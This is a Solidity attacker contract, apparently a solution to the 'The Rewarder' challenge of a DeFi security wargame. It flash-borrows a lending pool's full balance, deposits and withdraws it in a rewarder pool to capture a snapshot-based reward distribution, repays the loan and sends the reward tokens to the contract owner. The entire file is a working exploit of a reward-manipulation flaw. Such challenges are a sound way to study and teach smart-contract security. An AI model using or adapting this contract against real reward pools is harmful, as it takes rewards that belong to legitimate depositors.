// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "hardhat/console.sol";

interface IRewarderPool {
    function rewardToken() external view returns (IERC20);
    function deposit(uint256 amountToDeposit) external;
    function withdraw(uint256 amountToWithdraw) external;
    function distributeRewards() external returns (uint256);
}

interface ILoanerPool {
    function liquidityToken() external view returns (IERC20);
    function flashLoan(uint256 amount) external;
}

contract TheRewarderAttacker {
    address public owner;
    IRewarderPool public rPool;
    ILoanerPool public lPool;
    IERC20 public lToken;
    IERC20 public rToken;

    constructor(IRewarderPool _rPool, ILoanerPool _lPool) {
        owner = msg.sender;
        rPool = _rPool;
        lPool = _lPool;
        lToken = lPool.liquidityToken();
        rToken = rPool.rewardToken();
    }

    function attack() external {
        lPool.flashLoan(lToken.balanceOf(address(lPool))); // get all tokens
    }

    function receiveFlashLoan(uint256 amount) external {
        console.log("Get flash load with %s tokens", amount);
        lToken.approve(address(rPool), amount);
        rPool.deposit(amount);
        rPool.withdraw(amount);
        lToken.transfer(address(lPool), amount);
        rToken.transfer(owner, rToken.balanceOf(address(this)));
    }
}
